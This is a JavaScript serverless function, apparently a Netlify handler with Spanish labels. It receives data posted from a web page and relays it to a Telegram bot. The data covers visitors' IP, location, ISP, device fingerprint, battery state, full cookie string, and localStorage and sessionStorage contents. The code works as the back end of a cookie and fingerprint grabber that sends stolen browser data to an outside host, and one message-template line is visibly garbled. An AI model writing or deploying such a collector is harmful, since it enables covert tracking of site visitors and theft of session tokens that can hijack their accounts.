exports.handler = async (event) => {
  if (event.httpMethod === "OPTIONS") {
    return {
      statusCode: 200,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "Content-Type",
        "Access-Control-Allow-Methods": "POST, OPTIONS"
      },
      body: ""
    };
  }

  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      headers: { "Access-Control-Allow-Origin": "*" },
      body: JSON.stringify({ error: "Method Not Allowed" })
    };
  }

  try {
    const data = JSON.parse(event.body || "{}");

    const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TOKEN || !CHAT_ID) {
      return {
        statusCode: 500,
        headers: { "Access-Control-Allow-Origin": "*" },
        body: JSON.stringify({ success: false, error: "Faltan variables de entorno" })
      };
    }

    // Limpiar valores para que no salgan raros
    const clean = (v) => (v === undefined || v === null || v === "" ? "N/A" : String(v));

    const mensaje =
`474747 - Nueva información

Red
• IP: ${clean(data.ip)}
• País: ${clean(data.country)}
• Ciudad: ${clean(data.city)}
• Región: ${clean(data.region)}
• ISP: ${clean(data.isp)}
• Conexión: ${clean(data.conexion)}
• RTT: ${clean(data.rtt)}

Dispositivo
• OS: ${clean(data.os)}
• Navegador: ${clean(data.browser)}
• Tipo: ${clean(data.device)}
• RAM: ${clean(data.ram)}
• Núcleos: ${clean(data.nucleos)}
• Pantalla: \( {clean(data.pantalla)} ( \){clean(data.pixelRatio)}x)
• Pantalla disponible: ${clean(data.pantallaDisponible)}
• Orientación: ${clean(data.orientacion)}
• Color: ${clean(data.colorDepth)}

Batería
• Nivel: ${clean(data.bateria)}
• Estado: ${clean(data.cargando)}

Idioma / Zona
• Idioma: ${clean(data.idioma)}
• Idiomas: ${clean(data.idiomas)}
• Zona: ${clean(data.zonaHoraria)}

Almacenamiento y Cookies
• Cookies habilitadas: ${clean(data.cookiesEnabled)}
• Cookies: ${clean(data.cookies)}
• localStorage: ${clean(data.localStorage)}
• sessionStorage: ${clean(data.sessionStorage)}

Otras
• Táctil: ${clean(data.toque)}
• Touch points: ${clean(data.maxTouchPoints)}
• Online: ${clean(data.online)}
• PDF Viewer: ${clean(data.pdfViewer)}
• Webdriver: ${clean(data.webdriver)}
• Vendor: ${clean(data.vendor)}
• Referrer: ${clean(data.referrer)}

${new Date().toLocaleString("es-AR", { timeZone: "America/Argentina/Buenos_Aires" })}`;

    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: mensaje
      })
    });

    const result = await response.json();

    if (!response.ok) {
      console.error("Telegram error:", result);
      return {
        statusCode: 500,
        headers: { "Access-Control-Allow-Origin": "*" },
        body: JSON.stringify({ success: false, error: "Error de Telegram", details: result })
      };
    }

    return {
      statusCode: 200,
      headers: {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*"
      },
      body: JSON.stringify({ success: true, message: "Enviado correctamente" })
    };

  } catch (error) {
    console.error("Error general:", error);
    return {
      statusCode: 500,
      headers: { "Access-Control-Allow-Origin": "*" },
      body: JSON.stringify({ success: false, error: error.message })
    };
  }
};
